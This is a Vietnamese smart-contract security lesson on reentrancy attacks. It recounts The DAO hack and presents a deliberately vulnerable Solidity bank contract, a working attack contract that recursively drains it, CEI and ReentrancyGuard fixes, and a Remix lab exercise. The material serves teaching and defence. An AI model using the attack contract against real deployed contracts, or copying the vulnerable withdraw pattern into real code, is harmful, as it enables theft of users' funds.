---
title: "Ngày 18: Tấn công Tái nhập (Reentrancy Attack) & Lập trình phòng thủ"
description: "Mổ xẻ lỗ hổng bảo mật kinh điển nhất lịch sử blockchain. Tìm hiểu cách The DAO bị tấn công, lập trình mô phỏng cuộc tấn công tái nhập và làm chủ mẫu phòng thủ CEI."
---

# Ngày 18: Tấn công Tái nhập (Reentrancy Attack) & Lập trình phòng thủ

Chào mừng bạn đến với ngày thứ 18! Chúng ta chính thức bước vào phân khu cuối cùng và cũng là phân khu kịch tính nhất của khóa học: **Làm chủ bảo mật Web3 & Smart Contract Audit**.

Trong thế giới Blockchain, bảo mật là ranh giới mong manh giữa sự thành công rực rỡ và thảm họa sụp đổ hoàn toàn. Hôm nay, chúng ta sẽ cùng nghiên cứu **Tái nhập (Reentrancy Attack)** - lỗ hổng bảo mật kinh điển, nổi tiếng và nguy hiểm nhất lịch sử Blockchain. 

Năm 2016, một đòn tấn công Reentrancy nhắm vào dự án **The DAO** đã cướp đi **3.6 triệu ETH** (tương đương hơn 15% tổng cung Ethereum lúc bấy giờ), buộc mạng lưới Ethereum phải thực hiện một cuộc chia tách lịch sử (Hard Fork) thành hai mạng lưới độc lập là Ethereum (ETH) và Ethereum Classic (ETC) như ngày nay.

Hãy cùng phân tích bản chất kỹ thuật của đòn tấn công này và học cách xây dựng phòng tuyến tuyệt đối để bảo vệ tài sản của dự án.

---

## 1. Bản chất kỹ thuật của Reentrancy

Lỗ hổng Tái nhập xảy ra khi một Smart Contract gửi tiền (ETH hoặc Token) cho một địa chỉ bên ngoài **TRƯỚC KHI** nó cập nhật lại sổ sách ghi nhận số dư của mình.

### Kịch bản "Rút tiền lặp vô hạn":
Hãy tưởng tượng bạn vào một ngân hàng truyền thống để rút toàn bộ số dư 10 triệu đồng:
1.  Bạn yêu cầu rút tiền.
2.  Giao dịch viên chuyển 10 triệu đồng cho bạn.
3.  **Trước khi** giao dịch viên kịp gõ phím để trừ số dư của bạn trên máy tính về 0, bạn ngay lập tức hét lên: *"Tôi muốn rút tiếp 10 triệu nữa!"*.
4.  Giao dịch viên nhìn vào máy tính vẫn thấy số dư là 10 triệu, tiếp tục đưa tiền cho bạn.
5.  Chu kỳ này lặp đi lặp lại cho đến khi két sắt của ngân hàng trống rỗng!

Trong Solidity, khi một hợp đồng gửi ETH đến một địa chỉ ví Smart Contract của Hacker bằng lệnh `.call{value: amount}("")`, máy ảo EVM sẽ **tạm dừng** việc thực thi của hợp đồng ngân hàng và **nhường quyền điều khiển** cho hàm nhận tiền (`receive()` hoặc `fallback()`) của hợp đồng Hacker. 

Lợi dụng quyền điều khiển này, hợp đồng của Hacker sẽ ngay lập tức **gọi ngược lại** (tái nhập - re-enter) hàm rút tiền của ngân hàng để thực hiện lượt rút tiền tiếp theo trong khi số dư của nó chưa hề bị trừ đi!

---

## 2. Mô phỏng cuộc tấn công Reentrancy bằng Code thực tế

Hãy cùng lập trình một hợp đồng ngân hàng bị lỗi bảo mật `VulnerableBank` và một hợp đồng độc hại `Attack` của Hacker để thấy rõ cách cuộc tấn công diễn ra.

### 2.1. Hợp đồng ngân hàng bị lỗi (`VulnerableBank.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableBank {
    mapping(address => uint256) public balanceOf;

    function deposit() public payable {
        balanceOf[msg.sender] += msg.value;
    }

    // HÀM RÚT TIỀN BỊ LỖI BẢO MẬT NGHIÊM TRỌNG!
    function withdraw() public {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "So du bang 0!");

        // 1. Thực hiện chuyển ETH đi trước (Nhường quyền điều khiển cho người nhận)
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Chuyen tien that bai!");

        // 2. Cập nhật lại số dư sau (Lệnh này sẽ KHÔNG bao giờ được chạy đến 
        // cho đến khi hacker hoàn tất việc rút sạch tiền)
        balanceOf[msg.sender] = 0;
    }

    function getContractBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

---

### 2.2. Hợp đồng tấn công độc hại của Hacker (`Attack.sol`)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./VulnerableBank.sol";

contract Attack {
    VulnerableBank public bank;
    address public owner;

    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
        owner = msg.sender;
    }

    // Hàm nhận tiền tự động kích hoạt khi VulnerableBank chuyển ETH về
    receive() external payable {
        // Nếu số dư của ngân hàng vẫn lớn hơn hoặc bằng 1 ETH
        if (address(bank).balance >= 1 ether) {
            // TÁI NHẬP: Gọi lại hàm withdraw để cướp tiếp tiền!
            bank.withdraw();
        }
    }

    // Kích hoạt cuộc tấn công
    function attack() public payable {
        require(msg.value == 1 ether, "Yeu cau gui dung 1 ETH de tan cong!");
        
        // 1. Nạp 1 ETH vào ngân hàng để tạo uy tín
        bank.deposit{value: 1 ether}();
        
        // 2. Kích hoạt lượt rút tiền đầu tiên
        bank.withdraw();
    }

    // Rút toàn bộ số tiền cướp được về ví của Hacker
    function withdrawStolenFunds() public {
        require(msg.sender == owner, "Khong phai hacker owner!");
        payable(owner).transfer(address(this).balance);
    }
}
```

---

## 3. Các giải pháp phòng thủ tuyệt đối

Để bảo vệ hợp đồng của bạn trước đòn tấn công Reentrancy, chúng ta có hai vũ khí tối thượng:

### 3.1. Quy tắc thiết kế Checks-Effects-Interactions (CEI Pattern)
Đây là tiêu chuẩn thiết kế bắt buộc cho mọi hàm trong Solidity. Hãy luôn tổ chức thứ tự các dòng lệnh theo đúng quy tắc này:
1.  **Checks (Kiểm tra):** Thực hiện tất cả các lệnh `require`, `if-revert` để xác thực điều kiện đầu vào.
2.  **Effects (Cập nhật trạng thái):** Cập nhật toàn bộ các biến trạng thái, số dư sổ sách trong hợp đồng **trước**.
3.  **Interactions (Tương tác bên ngoài):** Cuối cùng mới thực hiện việc gọi hàm sang contract khác hoặc chuyển tiền.

#### Áp dụng CEI để sửa lỗi hàm rút tiền:
```solidity
function withdrawSafe() public {
    // 1. Checks
    uint256 balance = balanceOf[msg.sender];
    require(balance > 0, "So du bang 0!");

    // 2. Effects (Cập nhật sổ sách trước!)
    balanceOf[msg.sender] = 0;

    // 3. Interactions (Chuyển tiền sau cùng)
    (bool success, ) = msg.sender.call{value: balance}("");
    require(success, "Chuyen tien that bai!");
}
```
*Vì số dư của Hacker đã bị trừ về 0 ở bước 2, khi contract Hacker cố gắng gọi lại hàm `withdrawSafe` lần thứ hai (tái nhập), nó sẽ bị chặn đứng ngay lập tức ở bước 1 vì `balanceOf` lúc này bằng 0!*

### 3.2. Sử dụng `ReentrancyGuard` của OpenZeppelin
Nếu logic hợp đồng quá phức tạp và khó áp dụng quy tắc CEI, bạn có thể kế thừa thư viện **`ReentrancyGuard`** và thêm modifier **`nonReentrant`** vào các hàm nhạy cảm.

Modifier này hoạt động như một chiếc khóa cửa đơn giản: Khi bắt đầu hàm, nó khóa cửa lại (`lock = true`). Nếu có bất kỳ lệnh gọi nào cố tình tái nhập vào hàm đó trong khi khóa đang đóng, giao dịch sẽ bị tự động khôi phục (revert) ngay lập tức. Sau khi hàm chạy xong hoàn toàn, khóa sẽ được mở ra.

```solidity
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

contract SecureBank is ReentrancyGuard {
    mapping(address => uint256) public balanceOf;

    // Thêm modifier nonReentrant để chống tái nhập tuyệt đối
    function withdraw(uint256 _amount) public nonReentrant {
        require(balanceOf[msg.sender] >= _amount, "Khong du so du!");
        
        balanceOf[msg.sender] -= _amount;
        payable(msg.sender).transfer(_amount);
    }
}
```

---

## Tổng kết Ngày 18

Hôm nay bạn đã mổ xẻ thành công "nỗi khiếp sợ" lớn nhất của thế giới DeFi:
1.  Hiểu bản chất của đòn **Tấn công tái nhập (Reentrancy Attack)** và luồng nhường quyền điều khiển của máy ảo EVM.
2.  Tự tay lập trình và mô phỏng được cuộc tấn công thực tế giữa hai hợp đồng `VulnerableBank` và `Attack`.
3.  Làm chủ **Quy tắc Checks-Effects-Interactions (CEI)** - triết lý lập trình phòng thủ tối cao.
4.  Biết cách tích hợp **`ReentrancyGuard`** OpenZeppelin để xây dựng lá chắn bảo vệ tuyệt đối.

**Bài tập thực hành:**
Hãy mở Remix IDE của bạn lên và tiến hành cuộc tấn công giả lập:
1. Deploy hợp đồng `VulnerableBank`.
2. Dùng 3 tài khoản ví lành mạnh khác nhau nạp vào ngân hàng này tổng cộng `10 ETH`.
3. Deploy hợp đồng `Attack` và truyền địa chỉ của `VulnerableBank` vào tham số constructor.
4. Dùng tài khoản của Hacker gọi hàm `attack` kèm theo gửi đúng `1 ETH`.
5. Kiểm tra số dư của hợp đồng `Attack` và `VulnerableBank`. Bạn sẽ chứng kiến một điều kinh ngạc: Hợp đồng ngân hàng bị rút sạch sành sanh `11 ETH` về ví của Hacker!
6. Sửa lại code ngân hàng theo quy tắc **CEI** hoặc thêm `nonReentrant` và chạy lại để xác nhận Hacker không còn cơ hội cướp tiền.

Ngày mai, chúng ta sẽ nghiên cứu hai lỗ hổng bảo mật cực kỳ tinh vi khác liên quan đến lỗi logic toán học và phân quyền: **Overflow/Underflow** và **Phân quyền lỏng lẻo**. Hẹn gặp lại bạn!
